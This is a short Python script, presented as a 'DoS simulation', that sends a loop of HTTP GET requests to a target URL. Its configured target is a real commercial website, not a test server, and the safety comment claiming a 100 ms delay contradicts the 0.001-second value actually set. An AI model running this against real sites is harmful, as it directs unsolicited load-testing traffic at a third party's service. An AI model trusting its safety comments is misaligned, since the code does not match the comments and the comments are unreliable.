import requests 
import time

def simulate_dos(target_url, number_of_requests, delay=0.1):
    """
    Simulates a DoS attack by sending multiple HTTP requests to a target server
    
    Args:
        target_url (str): URL of the test server
        number_of_requests (int): Total requests to send
        delay (float): Seconds between requests (default: 0.1s)
    """
    for i in range(number_of_requests):
        try:
            response = requests.get(target_url)
            print(f"Request {i+1}/{number_of_requests}: HTTP {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request {i+1}/{number_of_requests}: Failed - {str(e)}")
        
        # Rate limiting for safety
        time.sleep(delay)

if __name__ == "__main__":
    # CONFIGURATION - MUST BE MODIFIED FOR TEST ENVIRONMENT
    TARGET_URL = "https://www.godaddy.com/"  # Replace with test server
    TOTAL_REQUESTS = 100  # Controlled request count
    REQUEST_DELAY = 0.001  # 100ms between requests
    
    # Safety confirmation
    print(f"Starting DoS simulation against {TARGET_URL}")
    print(f"Configuration: {TOTAL_REQUESTS} requests with {REQUEST_DELAY}s delay")
    input("Press Enter to continue (ensure test environment is isolated)...")
    
    # Execute simulation
    simulate_dos(TARGET_URL, TOTAL_REQUESTS, REQUEST_DELAY)
    print("Simulation completed. Monitor server for impact analysis.")
